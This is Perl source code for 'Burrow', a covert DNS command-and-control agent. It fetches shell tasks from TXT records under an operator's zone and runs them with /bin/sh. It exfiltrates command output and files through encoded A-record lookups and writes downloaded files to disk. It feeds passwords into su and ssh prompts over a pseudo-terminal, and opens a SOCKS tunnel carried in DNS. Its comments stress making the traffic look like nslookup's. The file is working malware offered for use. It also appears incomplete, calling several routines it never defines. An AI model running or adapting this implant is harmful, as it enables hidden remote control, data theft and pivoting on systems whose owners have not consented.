#!/usr/bin/perl
# Burrow agent - DNS command channel and tunnel client for AIX (and Linux).
# Perl core modules and nslookup only, no compiler, no CPAN.
#
#   nohup perl burrowclient.pl tunnel.example.com </dev/null >/dev/null 2>&1 &
#
#   perl burrowclient.pl <zone> [poll_seconds] [resolver_ip] [resolver_port]
#
# The agent polls TXT <rand>.<cid>.v2.<zone> for a task (base64), runs it with
# /bin/sh and returns the output hex-encoded in A lookups under
# <tid>.<cid>.o.<zone>. Tasks starting with "@" are built in:
#   @sleep <s>               poll interval          @ping              version, pid, mode
#   @pty <t>\n<pw>\n<cmd>    command under a pty, password typed at its prompt
#   @get <path>              send a file back       @put <xid> <n> <path>   fetch a transfer, write it
#   @task <xid> <n>          fetch a long task      @probe <sizes>     which answer sizes arrive
#   @tunnel start|stop|status   SOCKS/forward tunnel child (see tunnel_main below)
#   exit                     stop (and the tunnel child)
#
# DNS queries go straight to the resolver from a UDP socket when that works
# (fast, several in flight for uploads) and through nslookup otherwise; every
# query falls back to nslookup on its own if raw mode gets no answer. Small
# answers never use EDNS, so on the wire they look like nslookup's queries.
# Nothing is written to disk unless a task says so (@put, shell commands).
# Debug log on stderr with BURROWDEBUG=1.

use strict;
use warnings;
use IO::Socket::INET;
use IO::Select;
use Errno qw(EAGAIN EWOULDBLOCK EINTR EINPROGRESS);
use Socket qw(inet_aton pack_sockaddr_in SOL_SOCKET SO_ERROR);
use MIME::Base64 qw(decode_base64);
use POSIX qw(setsid ttyname WNOHANG);
use Time::HiRes qw(time);

my $VERSION  = 2;
my $zone     = shift or die "usage: $0 <zone> [poll_seconds] [resolver_ip] [resolver_port]\n";
my $interval = shift || 2;
my $resolver = shift || '';
my $rport    = shift || 53;
$zone =~ s/^\.+//;
$zone =~ s/\.+$//;

my $cmd_timeout = 60;        # seconds per shell command
my $max_output  = 30000;     # bytes of shell output per command
my $max_get     = 262144;    # bytes per @get
my $label_len   = 60;        # DNS label limit is 63

$SIG{HUP}  = 'IGNORE';
$SIG{PIPE} = 'IGNORE';
srand();
my $cid   = sprintf('%06x', int rand 0xffffff);
my $DEBUG = ($ENV{BURROWDEBUG} || $ENV{TUNDEBUG}) ? 1 : 0;
sub dbg { warn sprintf("%.3f %s\n", time, $_[0]) if $DEBUG }
sub hsleep { select(undef, undef, undef, $_[0]) if $_[0] > 0 }

# ---------------- resolver ----------------
my $raw_ip = $resolver;                                   # where raw UDP queries go
if ($raw_ip eq '' && open my $rc, '<', '/etc/resolv.conf') {
    while (<$rc>) { if (/^\s*nameserver\s+(\S+)/) { $raw_ip = $1; last } }
    close $rc;
}

# ======================================================================
# DNS wire format (raw mode) and nslookup (fallback)
# ======================================================================
my $EDNS = 1232;

sub dns_build {
    my ($id, $name, $type, $edns) = @_;
    my $p = pack('n6', $id, 0x0100, 1, 0, 0, $edns ? 1 : 0);
    $p .= pack('C/a*', $_) for split /\./, $name;
    $p .= "\0" . pack('nn', $type, 1);
    $p .= "\0" . pack('nnNn', 41, $EDNS, 0, 0) if $edns;  # OPT: allow big answers
    return $p;
}

sub read_name {                                           # returns offset after the name
    my ($buf, $off) = @_;
    my ($next, $hops) = (undef, 0);
    while ($off < length $buf) {
        my $len = ord substr($buf, $off, 1);
        if ($len == 0) { $off++; last }
        if (($len & 0xC0) == 0xC0) {
            $next = $off + 2 unless defined $next;
            $off = unpack('n', substr($buf, $off, 2)) & 0x3FFF;
            last if ++$hops > 10;
            next;
        }
        $off += 1 + $len;
    }
    return defined $next ? $next : $off;
}

sub dns_parse {                                           # -> (id, rcode, ancount, joined TXT, tc)
    my ($buf) = @_;
    return () if length($buf) < 12;
    my ($id, $flags, $qd, $an) = unpack 'n4', $buf;
    my $off = 12;
    for (1 .. $qd) { $off = read_name($buf, $off) + 4 }
    my $txt = '';
    for (1 .. $an) {
        $off = read_name($buf, $off);
        last if $off + 10 > length $buf;
        my ($type, undef, undef, $rdlen) = unpack 'nnNn', substr($buf, $off, 10);
        $off += 10;
        if ($type == 16) {
            my $p = $off;
            while ($p < $off + $rdlen) {
                my $l = ord substr($buf, $p, 1);
                $txt .= substr($buf, $p + 1, $l);
                $p += 1 + $l;
            }
        }
        $off += $rdlen;
    }
    return ($id, $flags & 0xF, $an, $txt, ($flags & 0x0200) ? 1 : 0);
}

sub ns_query {                                            # -> (ok, txt, how)  how: ns | tcp
    my ($type, $name, $patient) = @_;
    my $opts = '-querytype=' . ($type == 16 ? 'TXT' : 'A') . ($patient ? ' -timeout=4 -retry=2' : ' -timeout=3 -retry=1');
    $opts .= " -port=$rport" if $rport != 53;
    my $out = '';
    eval {
        local $SIG{ALRM} = sub { die "nslookup timeout\n" };
        alarm 30;
        $out = qx{nslookup $opts $name. $resolver 2>&1};
        alarm 0;
    };
    alarm 0;
    $out = '' unless defined $out;
    my $how = $out =~ /Truncated/i ? 'tcp' : 'ns';
    return ($out =~ /^Name:/m ? 1 : 0, '', $how) if $type == 1;
    for my $line (split /\n/, $out) {
        next unless $line =~ /text\s*=\s*(.*)$/;
        my ($rest, $joined) = ($1, '');
        while ($rest =~ /"((?:[^"\\]|\\.)*)"/g) { my $s = $1; $s =~ s/\\(.)/$1/g; $joined .= $s }
        return (1, $joined, $how);
    }
    return (0, '', $how);
}

# ---------------- raw UDP, synchronous (beacon side) ----------------
my $udp;                     # raw socket, undef when unusable
my $raw_bad = 0;             # raw failures in a row that nslookup then rescued
my $raw_off_until = 0;       # raw mode paused until this time
my $srtt = 0;
my $timeout = 3;             # adapts to 2.5x the measured round trip, 2..15 s
my $next_id = int rand 65536;

sub raw_open {
    return 0 if $raw_ip eq '';
    $udp = IO::Socket::INET->new(Proto => 'udp', PeerAddr => $raw_ip, PeerPort => $rport) or return 0;
    $udp->blocking(0);
    return 1;
}

sub note_rtt {
    my ($rtt) = @_;
    $srtt = $srtt ? 0.8 * $srtt + 0.2 * $rtt : $rtt;
    $timeout = 2.5 * $srtt;
    $timeout = 2  if $timeout < 2;
    $timeout = 15 if $timeout > 15;
}

sub raw_usable { return $udp && time >= $raw_off_until }

sub query {                                               # one query, raw then nslookup -> (ok, txt, how)
    my ($type, $name, $edns) = @_;
    my $tried_raw = 0;
    if (raw_usable()) {
        $tried_raw = 1;
        my $id = $next_id++ & 0xffff;
        my $pkt = dns_build($id, $name, $type, $edns);
        my $sel = IO::Select->new($udp);
        my $t0 = time;
      TRY: for my $try (1, 2) {
            $udp->send($pkt);
            my $deadline = time + $timeout * $try;
            while ((my $left = $deadline - time) > 0) {
                last unless $sel->can_read($left);
                my $buf = '';
                my $r = $udp->recv($buf, 4096);
                next unless defined $r && length $buf;
                my ($rid, $rcode, $an, $txt, $tc) = dns_parse($buf);
                next unless defined $rid && $rid == $id;
                if ($rcode == 0 && $an > 0) {
                    note_rtt(time - $t0);
                    $raw_bad = 0;
                    return (1, $txt, 'raw');
                }
                dbg("raw $name: rcode $rcode, $an answers" . ($tc ? ", truncated" : ""));
                last TRY;                                 # negative or truncated: let nslookup handle it (TCP retry)
            }
        }
    }
    my ($ok, $txt, $how) = ns_query($type, $name, 1);
    if ($tried_raw && $ok && ++$raw_bad >= 5) {
        $raw_off_until = time + 300;
        $raw_bad = 0;
        dbg("raw mode gets no answers while nslookup does: raw paused for 5 minutes");
    }
    return ($ok, $txt, $how);
}

sub send_names {                                          # A queries in bulk; returns how many never got an answer
    my ($names) = @_;
    my @todo = @$names;
    if (raw_usable() && @todo) {
        my (%pending, @failed);
        my $sel = IO::Select->new($udp);
        my $total = @todo;
        while (@todo || %pending) {
            while (@todo && keys(%pending) < 16) {
                my $name = shift @todo;
                my $id = $next_id++ & 0xffff;
                $id = $next_id++ & 0xffff while exists $pending{$id};
                $pending{$id} = { name => $name, sent => time, first => time, tries => 1 };
                $udp->send(dns_build($id, $name, 1, 0));
            }
            if ($sel->can_read(0.1)) {
                while (1) {
                    my $buf = '';
                    my $r = $udp->recv($buf, 4096);
                    last unless defined $r && length $buf;
                    my ($rid, $rcode, $an) = dns_parse($buf);
                    next unless defined $rid && $pending{$rid};
                    if ($rcode == 0 && $an > 0) { note_rtt(time - $pending{$rid}{first}); delete $pending{$rid} }
                    else { $pending{$rid}{sent} = time }
                }
            }
            my $now = time;
            for my $id (keys %pending) {
                my $p = $pending{$id};
                next unless $now - $p->{sent} > $timeout;
                if (++$p->{tries} > 3) { push @failed, $p->{name}; delete $pending{$id}; next }
                $p->{sent} = $now;
                $udp->send(dns_build($id, $p->{name}, 1, 0));
            }
        }
        if (@failed == $total && $total >= 2) {
            $raw_off_until = time + 300;
            dbg("no raw upload query was answered: raw paused for 5 minutes");
        }
        dbg(scalar(@failed) . " of $total upload queries fall back to nslookup") if @failed;
        @todo = @failed;
    }
    my $failed = 0;
    for my $name (@todo) {
        my $ok = 0;
        for my $try (1 .. 3) {
            ($ok) = ns_query(1, $name, 1);
            last if $ok;
            sleep 1;
        }
        $failed++ unless $ok;
    }
    return $failed;
}

# ======================================================================
# Beacon: tasks and output
# ======================================================================
my $tunnel_pid = 0;

sub run_cmd {
    my ($cmd) = @_;
    my $out = '';
    my $pid;
    eval {
        local $SIG{ALRM} = sub { die "timeout\n" };
        alarm $cmd_timeout;
        $pid = open(my $fh, '-|', '/bin/sh', '-c', "exec 2>&1\n$cmd")
            or die "cannot run /bin/sh: $!\n";
        local $/ = undef;
        $out = <$fh>;
        close $fh;
        alarm 0;
    };
    alarm 0;
    $out = '' unless defined $out;
    if ($@) {
        kill 'TERM', $pid if $pid;
        $out .= ($@ =~ /^timeout/)
            ? "\n[agent: command timed out after ${cmd_timeout}s]\n"
            : "\n[agent: $@]";
    }
    if (length($out) > $max_output) {
        $out = substr($out, 0, $max_output) . "\n[agent: output truncated at $max_output bytes]\n";
    }
    $out = "[no output]\n" if $out eq '';
    return $out;
}

sub send_output {
    my ($tid, $data) = @_;
    my $hex    = unpack('H*', $data);
    my $suffix = ".$tid.$cid.o.$zone";
    my $room   = 253 - length($suffix) - 7;            # 7: "s99999."
    my $labels = int($room / ($label_len + 1));
    $labels = 1 if $labels < 1;
    $labels = 3 if $labels > 3;
    my $per = $labels * $label_len;
    my (@names, $seq);
    $seq = 0;
    while (length $hex) {
        my $chunk = substr($hex, 0, $per, '');
        my @parts = ($chunk =~ /(.{1,$label_len})/g);
        push @names, "s$seq." . join('.', @parts) . $suffix;
        $seq++;
    }
    my $failed = send_names(\@names);
    dbg("output for task $tid: $seq chunks, $failed never acknowledged") if $failed;
    send_names(["e$seq$suffix"]);                     # end marker last: the server knows the count only then
}

sub fetch_transfer {                                      # y0..y<n-1>.<xid> as hex -> bytes, undef on failure
    my ($xid, $n) = @_;
    my $hex = '';
    for my $i (0 .. $n - 1) {
        my $got;
        for my $try (1 .. 3) {
            my ($ok, $txt) = query(16, "y$i.$xid.$zone", 0);
            if ($ok && $txt =~ /^[0-9a-f]+$/) { $got = $txt; last }
            hsleep(1);
        }
        return undef unless defined $got;
        $hex .= $got;
    }
    query(16, "y$n.$xid.$zone", 0);                       # end marker: the console logs the fetch
    return pack('H*', $hex);
}

sub md5_hex_of {
    my ($data) = @_;
    my $d = eval { require Digest::MD5; Digest::MD5::md5_hex($data) };
    return defined $d ? $d : '-';
}

sub get_file {
    my ($path) = @_;
    $path =~ s/^\s+//;
    $path =~ s/\s+$//;
    return "err no path given\n" if $path eq '';
    open(my $fh, '<', $path) or return "err cannot open $path: $!\n";
    binmode $fh;
    my $data = do { local $/; <$fh> };
    close $fh;
    $data = '' unless defined $data;
    my $size = length $data;
    my $note = '';
    if ($size > $max_get) {
        substr($data, $max_get) = '';
        $note = " truncated-from $size";
    }
    return "ok " . length($data) . " " . md5_hex_of($data) . "$note\n" . $data;
}

sub put_file {
    my ($xid, $n, $path) = @_;
    return "put: bad arguments\n" unless defined $path && $n =~ /^\d+$/;
    $path =~ s/^\s+//;
    $path =~ s/\s+$//;
    my $data = fetch_transfer($xid, $n);
    return "put: transfer fetch failed\n" unless defined $data;
    open(my $fh, '>', $path) or return "put: cannot write $path: $!\n";
    binmode $fh;
    print $fh $data;
    close $fh;
    return "put: " . length($data) . " bytes written to $path, md5 " . md5_hex_of($data) . "\n";
}

sub probe {                                               # which TXT answer sizes come back, three ways
    my ($list) = @_;
    my @sizes = grep { /^\d+$/ && $_ > 0 && $_ <= 4000 } split /[,\s]+/, $list;
    return "probe: no sizes\n" unless @sizes;
    my $out = "probe from $cid, resolver " . ($raw_ip ne '' ? "$raw_ip:$rport" : 'system default')
        . ($udp ? '' : ' (raw UDP socket unavailable)') . "\n";
    $out .= sprintf("%6s  %-20s %-20s %-20s\n", 'size', 'nslookup', 'raw udp', 'raw udp + edns');
    my %res;
    if ($udp) {
        my %pend;
        my $sel = IO::Select->new($udp);
        for my $s (@sizes) {
            for my $e (0, 1) {
                my $id = $next_id++ & 0xffff;
                $id = $next_id++ & 0xffff while exists $pend{$id};
                my $name = sprintf('%d.%04x.%s.z.%s', $s, int rand 0xffff, $cid, $zone);
                $pend{$id} = { size => $s, edns => $e, sent => time };
                $udp->send(dns_build($id, $name, 16, $e));
            }
        }
        my $deadline = time + 6;
        while (%pend) {
            my $left = $deadline - time;
            last if $left <= 0 || !$sel->can_read($left);
            my $buf = '';
            my $r = $udp->recv($buf, 4096);
            next unless defined $r && length $buf;
            my ($rid, $rcode, $an, $txt, $tc) = dns_parse($buf);
            next unless defined $rid && $pend{$rid};
            my $p = delete $pend{$rid};
            my $what = ($rcode == 0 && $an > 0 && length($txt) == $p->{size}) ? sprintf('ok %.1fs', time - $p->{sent})
                     : $tc ? 'truncated (TC)' : $rcode ? "rcode $rcode" : $an ? 'short ' . length($txt) : 'empty';
            $res{ $p->{size} }{ $p->{edns} ? 'edns' : 'raw' } = $what;
        }
    }
    for my $s (@sizes) {
        my $t0 = time;
        my $name = sprintf('%d.%04x.%s.z.%s', $s, int rand 0xffff, $cid, $zone);
        my ($ok, $txt, $how) = ns_query(16, $name, 0);
        my $r = !$ok ? '-- no answer'
              : length($txt) == $s ? sprintf('ok%s %.1fs', $how eq 'tcp' ? ' (tcp)' : '', time - $t0)
              : 'short ' . length($txt);
        my $none = $udp ? '-- no answer' : 'n/a';
        $out .= sprintf("%6d  %-20s %-20s %-20s\n", $s, $r, $res{$s}{raw} || $none, $res{$s}{edns} || $none);
    }
    $out .= "ok (tcp): the answer was too big for UDP and nslookup fetched it over TCP\n";
    return $out;
}

# ---------------- pseudo-terminal: su / ssh password prompts ----------------
sub pty_run {
    my ($cmd, $pw, $limit) = @_;
    $cmd = '' unless defined $cmd;
    $pw = '' unless defined $pw;
    $limit = 35 unless defined $limit && $limit =~ /^\d+$/ && $limit > 0;
    return "pty: no command\n" if $cmd eq '';
    my $match = 'assword:';
    my ($master, $slave);
    if (-e '/dev/ptc') {                                  # AIX: clone master, ttyname gives the slave
        open($master, '+<', '/dev/ptc') or return "pty: open /dev/ptc: $!\n";
        $slave = ttyname(fileno $master) or return "pty: ttyname on /dev/ptc failed: $!\n";
    } elsif (-e '/dev/ptmx') {                            # Linux
        open($master, '+<', '/dev/ptmx') or return "pty: open /dev/ptmx: $!\n";
        my $z = pack 'i', 0;
        ioctl($master, 0x40045431, $z) or return "pty: TIOCSPTLCK: $!\n";
        my $n = pack 'i', 0;
        ioctl($master, 0x80045430, $n) or return "pty: TIOCGPTN: $!\n";
        $slave = '/dev/pts/' . unpack 'i', $n;
    } else {
        return "pty: no /dev/ptc or /dev/ptmx on this system\n";
    }
    my $pid = fork;
    return "pty: fork: $!\n" unless defined $pid;
    if ($pid == 0) {
        setsid();
        open(my $s, '+<', $slave) or exit 126;            # first tty after setsid: controlling terminal
        ioctl($s, 0x540E, 0) if $^O eq 'linux';           # TIOCSCTTY, belt and braces
        open STDIN,  '<&', $s or exit 126;
        open STDOUT, '>&', $s or exit 126;
        open STDERR, '>&', $s or exit 126;
        close $master;
        exec '/bin/sh', '-c', $cmd;
        exit 127;
    }
    my $sel = IO::Select->new($master);
    my ($buf, $out, $sent, $deadline) = ('', '', 0, time + $limit);
    my $status = -1;
    my $stopped = '';
    while (1) {
        my $left = $deadline - time;
        if ($left <= 0) { $stopped = "timed out after ${limit}s"; last }
        my @r = $sel->can_read($left > 0.5 ? 0.5 : $left);
        if (@r) {
            my $chunk = '';
            my $n = sysread($master, $chunk, 4096);
            last if !defined $n || $n == 0;               # EOF / EIO: the command has gone
            $buf .= $chunk;
            $out .= $chunk;
            if ($buf =~ /\(yes\/no(?:\/\[fingerprint\])?\)\?\s*$/) {      # ssh host key question
                syswrite($master, "yes\n");
                $buf = '';
            } elsif ($buf =~ /$match\s*$/) {
                if ($sent) { $stopped = 'password rejected (second prompt), stopped'; last }
                syswrite($master, "$pw\n");
                $sent = 1;
                $buf = '';
            }
            $buf = substr($buf, -400) if length $buf > 400;
        }
        my $w = waitpid($pid, WNOHANG);
        if ($w == $pid) { $status = $?; last }
    }
    if ($status == -1) {
        kill 'TERM', $pid;
        hsleep(0.3);
        my $w = waitpid($pid, WNOHANG);
        if ($w != $pid) { kill 'KILL', $pid; waitpid($pid, 0) }
        $status = $?;
        while ($sel->can_read(0.2)) {                     # drain what is left
            my $chunk = '';
            my $n = sysread($master, $chunk, 4096);
            last if !defined $n || $n == 0;
            $out .= $chunk;
        }
    }
    close $master;
    $out =~ s/\r//g;
    $out =~ s/^.*?$match[^\n]*\n//s if $sent;             # drop everything up to the prompt we answered
    $out =~ s/^\s*\n//;
    $out .= "\n" if length $out && $out !~ /\n$/;
    $out .= "[$stopped]\n" if $stopped;
    my $code = $stopped ? 124 : $status >> 8;
    $out .= "[exit $code]\n";
    return $out;
}

# ---------------- tunnel child ----------------
sub reap_tunnel {
    return unless $tunnel_pid;
    my $w = waitpid($tunnel_pid, WNOHANG);
    if ($w == $tunnel_pid || $w == -1) { dbg("tunnel child $tunnel_pid ended"); $tunnel_pid = 0 }
}

sub stop_tunnel {
    return unless $tunnel_pid;
    kill 'TERM', $tunnel_pid;
    my $gone = 0;
    for (1 .. 20) {
        my $w = waitpid($tunnel_pid, WNOHANG);
        if ($w == $tunnel_pid || $w == -1) { $gone = 1; last }
        hsleep(0.1);
    }
    if (!$gone) { kill 'KILL', $tunnel_pid; waitpid($tunnel_pid, 0) }
    $tunnel_pid = 0;
}

sub tunnel_ctl {
    my ($what) = @_;
    $what = '' unless defined $what;
    $what =~ s/^\s+//;
    $what =~ s/\s+$//;
    reap_tunnel();
    if ($what eq 'start') {
        return "tunnel already running (pid $tunnel_pid)\n" if $tunnel_pid;
        my $pid = fork;
        return "tunnel: fork failed: $!\n" unless defined $pid;
        if ($pid == 0) {
            if ($udp) { close $udp; $udp = undef }        # the child gets its own socket
            tunnel_main();
            exit 0;
        }
        $tunnel_pid = $pid;
        return "tunnel started (pid $pid) as client $cid\n";
    }
    if ($what eq 'stop') {
        return "tunnel not running\n" unless $tunnel_pid;
        stop_tunnel();
        return "tunnel stopped\n";
    }
    if ($what eq 'status') {
        return $tunnel_pid ? "tunnel running (pid $tunnel_pid)\n" : "tunnel not running\n";
    }
    return "usage: \@tunnel start|stop|status\n";
}

sub builtin {
    my ($task) = @_;
    my ($word, $rest) = $task =~ /^\@(\w+)[ \t]*(.*)$/s;
    return "unknown task\n" unless defined $word;
    $rest = '' unless defined $rest;
    if ($word eq 'ping') {
        return "pong: burrowclient.pl v$VERSION, cid $cid, pid $$, " . (raw_usable() ? 'raw udp' : 'nslookup')
            . " via " . ($raw_ip ne '' ? "$raw_ip:$rport" : 'system resolver') . ", poll every $interval s\n";
    }
    if ($word eq 'sleep') {
        my $s = $rest =~ /^\s*([\d.]+)\s*$/ ? $1 : 0;
        return "sleep: want 0.2 to 3600 seconds\n" unless $s >= 0.2 && $s <= 3600;
        $interval = $s;
        return "poll interval now $s s\n";
    }
    if ($word eq 'task') {
        my ($xid, $n) = split ' ', $rest;
        my $code = fetch_transfer($xid, $n);
        return "task: fetch failed\n" unless defined $code;
        return run_cmd($code);
    }
    if ($word eq 'pty') {
        my ($t, $pw, $cmd) = split /\n/, $rest, 3;
        return pty_run($cmd, $pw, $t);
    }
    return get_file($rest)                 if $word eq 'get';
    return put_file(split ' ', $rest, 3)   if $word eq 'put';
    return probe($rest)                    if $word eq 'probe';
    return tunnel_ctl($rest)               if $word eq 'tunnel';
    return "unknown built-in \@$word\n";
}

# ======================================================================
# Tunnel client (runs in a forked child): TCP connections for the
# server's SOCKS5 and port-forward listeners, carried in DNS.
# ======================================================================
#   poll  TXT p<n>.a<ack>[.r<old>].<cap>.<cid>.q  -> "#<bseq>~" + C|sid|host|port ~ D|sid|off|b64 ~ X|sid[|total] ~ Q ~ N
#   up    A   u<sid>-<seq>.<base32>.<cid>.v  k<sid>-<1|0>.<cid>.v  x<sid>-<seq>.<cid>.v
# Answers are applied strictly in bseq order and acknowledged in every poll, so a lost or
# late answer is re-asked and nothing is skipped. A poll whose answer never comes back
# under its name is re-asked under a new name (r<old>); if that fails too, raw mode gives
# way to nslookup mode. Q from the server ends the child.

my $MAX_INFLIGHT  = $ENV{TUNINFLIGHT} || 32;   # upload queries in the air at once (raw mode)
my $POLLS_AHEAD   = $ENV{TUNPOLLS} || 4;       # polls in the air at once while streams are open
my $MAX_TRIES     = 10;     # after this many, retries slow down to every 10 s (never give up on uploads)
my $REASK_AT      = 6;      # unanswered tries before a poll is re-asked under a new name
my $REASKS_MAX    = 3;      # re-asks before raw mode is abandoned for nslookup mode
my $CONNECT_WAIT  = 8;      # seconds for a TCP connect on the target before reporting failure
my $IDLE_POLL     = 1.0;    # seconds between polls with no streams open
my $BUSY_POLL     = $ENV{TUNPOLL} || 0.08;     # seconds between empty polls with streams open
my $BACKLOG       = 48;     # queued chunks per stream before its socket is left unread
my $CLOSE_WAIT    = 60;     # seconds to wait for the last bytes after the server said close

my ($tmode, $cap, $bigtest_sent, $tsuffix);
my ($tudp, %pending, $inflight);
my (%streams, %by_fd, @ctlq, @stuck);
my ($sel_r, $sel_w);
my ($pn, $polls_inflight, $next_poll, $poll_ok, $poll_failures, %poll_buf, $expect_bseq, $stuck_since);
my %pending_reasks;          # poll n -> how many times its content was re-asked already
my $CHUNK;

my $B32 = 'abcdefghijklmnopqrstuvwxyz234567';
sub b32 {
    my $bits = unpack 'B*', $_[0];
    $bits .= '0' x ((5 - length($bits) % 5) % 5);
    my $out = '';
    for (my $i = 0; $i < length $bits; $i += 5) {
        $out .= substr($B32, oct('0b' . substr($bits, $i, 5)), 1);
    }
    return $out;
}
sub labels { my ($s) = @_; return join '.', ($s =~ /(.{1,63})/g) }

sub tun_send_raw {
    my ($id, $q) = @_;
    my $edns = ($q->{kind} eq 'bigtest' || ($q->{kind} eq 'poll' && $cap eq 'b')) ? 1 : 0;
    $tudp->send(dns_build($id, $q->{name}, $q->{type}, $edns));
}

sub raw_send {
    my ($q) = @_;
    my $id = $next_id++ & 0xffff;
    $id = $next_id++ & 0xffff while exists $pending{$id};
    $q->{sent}  = time;
    $q->{first} = $q->{sent};
    $pending{$id} = $q;
    tun_send_raw($id, $q);
}

sub poll_name {                                           # -> (n, name); re-asks one stuck poll if any
    my $label = ($tmode eq 'raw' ? 'r' : 'n') . $cap . 'q';            # q: this client understands Q (stop)
    my $r = @stuck ? '.r' . shift(@stuck) : '';
    my $n = $pn++;
    return ($n, "p$n.a" . ($expect_bseq - 1) . "$r.$label.$cid.q.$zone");
}

sub send_query {
    my ($type, $name, $kind, $meta) = @_;
    $inflight++ if $kind ne 'poll';
    if ($tmode eq 'raw') {
        raw_send({ name => $name, type => $type, kind => $kind, meta => $meta, tries => 1 });
    } else {
        my ($ok, $txt) = ns_query($type, $name, 0);
        on_answer($kind, $meta, $ok, $txt);
    }
}

sub raw_fail {                                            # resend with the SAME id: a late answer still counts
    my ($id) = @_;
    my $q = $pending{$id};
    if ($q->{kind} eq 'bigtest' && $q->{tries} >= 3) {
        delete $pending{$id};
        dbg("1000-byte answers do not arrive: staying with small answers");
        $inflight--;
        return;
    }
    $q->{tries}++;
    if ($q->{kind} eq 'poll' && $q->{tries} >= $REASK_AT) {
        delete $pending{$id};
        $polls_inflight-- if $polls_inflight > 0;
        my $reasks = ($q->{meta}{reasks} || 0) + 1;
        dbg("poll $q->{meta}{n} unanswered $q->{tries} times: re-asking under a new name (re-ask $reasks)");
        push @stuck, $q->{meta}{n};
        $next_poll = 0;
        if ($reasks >= $REASKS_MAX && $tmode eq 'raw') {
            dbg("re-asked polls get no answer in raw mode either: switching to nslookup mode");
            switch_to_nslookup();
        } else {
            $pending_reasks{ $q->{meta}{n} } = $reasks;
        }
        return;
    }
    dbg("$q->{kind} query unanswered $q->{tries} times (timeout now " . sprintf('%.1f', $timeout) . "s): $q->{name}")
        if $q->{tries} == $MAX_TRIES;
    $q->{sent} = time;
    tun_send_raw($id, $q);
}

sub raw_pump {
    while (1) {
        my $buf = '';
        my $r = $tudp->recv($buf, 4096);
        last unless defined $r && length $buf;
        my ($id, $rcode, $an, $txt, $tc) = dns_parse($buf);
        next unless defined $id;
        my $q = $pending{$id} or next;
        if ($rcode == 0 && $an > 0) {
            delete $pending{$id};
            note_rtt(time - $q->{first});
            on_answer($q->{kind}, $q->{meta}, 1, $txt);
        } else {
            $q->{neg}++;
            dbg("$q->{kind} query answered with rcode $rcode, $an answers" . ($tc ? ", truncated" : "")
                . ": $q->{name}") if $q->{neg} == 1;
            $q->{sent} = time - $timeout + 1;             # a negative answer counts as a failed try, soon
        }
    }
}

sub raw_retry {
    my $now = time;
    for my $id (keys %pending) {
        my $t = $pending{$id}{tries};
        my $wait = $t >= $MAX_TRIES ? ($timeout > 10 ? $timeout : 10) : $timeout * ($t < 3 ? 1 : 2);
        raw_fail($id) if $now - $pending{$id}{sent} > $wait;
    }
}

sub queue_up { my ($st, $name, $kind) = @_; push @{ $st->{q} }, [ $name, $kind ] }

sub open_stream {
    my ($sid, $host, $port) = @_;
    return if $streams{$sid};                             # a repeated C must not reset a live connection
    my $ip = inet_aton($host);
    if (!$ip) { dbg("stream $sid cannot resolve $host"); push @ctlq, "k$sid-0$tsuffix"; return }
    my $sock = IO::Socket::INET->new(Proto => 'tcp');
    if (!$sock) { dbg("stream $sid socket failed: $!"); push @ctlq, "k$sid-0$tsuffix"; return }
    $sock->blocking(0);
    my $ok = connect($sock, pack_sockaddr_in($port, $ip));
    if (!$ok && $! != EINPROGRESS && $! != EWOULDBLOCK && $! != EAGAIN) {
        dbg("stream $sid connect $host:$port failed at once: $!");
        close $sock;
        push @ctlq, "k$sid-0$tsuffix";
        return;
    }
    my $st = $streams{$sid} = { sid => $sid, sock => $sock, q => [], useq => 0, wbuf => '',
                                eof => 0, paused => 0, unacked => 0, want => 0, dbuf => {},
                                connecting => time + $CONNECT_WAIT, host => "$host:$port" };
    $by_fd{ fileno $sock } = $sid;
    $sel_w->add($sock);
}

sub connect_done {                                        # socket became writable while connecting
    my ($st) = @_;
    my $err = getsockopt($st->{sock}, SOL_SOCKET, SO_ERROR);
    $err = defined $err ? unpack('i', $err) : -1;
    if ($err != 0) {
        $! = $err;
        dbg("stream $st->{sid} connect $st->{host} failed: $!");
        connect_failed($st);
        return;
    }
    dbg("stream $st->{sid} connected to $st->{host}");
    delete $st->{connecting};
    $sel_w->remove($st->{sock});
    $sel_r->add($st->{sock});
    push @ctlq, "k$st->{sid}-1$tsuffix";
    flush_socket($st) if length $st->{wbuf};
}

sub connect_failed {
    my ($st) = @_;
    my $sid = $st->{sid};
    delete $streams{$sid};
    $sel_w->remove($st->{sock});
    delete $by_fd{ fileno $st->{sock} };
    close $st->{sock};
    push @ctlq, "k$sid-0$tsuffix";
}

sub close_stream {
    my ($sid, $why) = @_;
    my $st = delete $streams{$sid} or return;
    dbg("stream $sid closed: " . ($why || 'server said X') . " (queued " . scalar(@{ $st->{q} })
        . ", unacked $st->{unacked}, useq $st->{useq}, applied $st->{want} B)");
    $sel_r->remove($st->{sock});
    $sel_w->remove($st->{sock});
    delete $by_fd{ fileno $st->{sock} };
    close $st->{sock};
}

sub finish_stream {                                       # server said close: after the pending bytes are written
    my ($st, $why) = @_;
    if (length $st->{wbuf} && !$st->{eof}) { $st->{close_when_flushed} = $why || 'server said X'; return }
    close_stream($st->{sid}, $why);
}

sub local_eof {                                           # peer went away: tell the server, after the data
    my ($st) = @_;
    return if $st->{eof};
    $st->{eof} = 1;
    $sel_r->remove($st->{sock});
    $sel_w->remove($st->{sock});
    $st->{wbuf} = '';
    queue_up($st, 'x' . $st->{sid} . '-' . $st->{useq} . $tsuffix, 'x');
    $st->{useq}++;
}

sub read_socket {
    my ($fh) = @_;
    my $sid = $by_fd{ fileno $fh };
    my $st = defined $sid ? $streams{$sid} : undef or return;
    my $buf = '';
    my $n = sysread($fh, $buf, 8192);
    if (!defined $n) {
        return if $! == EAGAIN || $! == EWOULDBLOCK || $! == EINTR;
        $n = 0;
    }
    if ($n == 0) { dbg("stream $sid eof from peer, useq $st->{useq}"); local_eof($st); return }
    while (length $buf) {
        my $piece = substr($buf, 0, $CHUNK, '');
        queue_up($st, 'u' . $sid . '-' . $st->{useq} . '.' . labels(b32($piece)) . $tsuffix, 'u');
        $st->{useq}++;
    }
    if (@{ $st->{q} } >= $BACKLOG && !$st->{paused}) { $st->{paused} = 1; $sel_r->remove($fh) }
}

sub flush_socket {
    my ($st) = @_;
    return unless length $st->{wbuf};
    my $n = syswrite($st->{sock}, $st->{wbuf});
    if (!defined $n) {
        if ($! == EAGAIN || $! == EWOULDBLOCK || $! == EINTR) { $sel_w->add($st->{sock}); return }
        local_eof($st);
        return;
    }
    substr($st->{wbuf}, 0, $n, '');
    if (length $st->{wbuf}) { $sel_w->add($st->{sock}); return }
    $sel_w->remove($st->{sock});
    close_stream($st->{sid}, $st->{close_when_flushed}) if $st->{close_when_flushed};
}

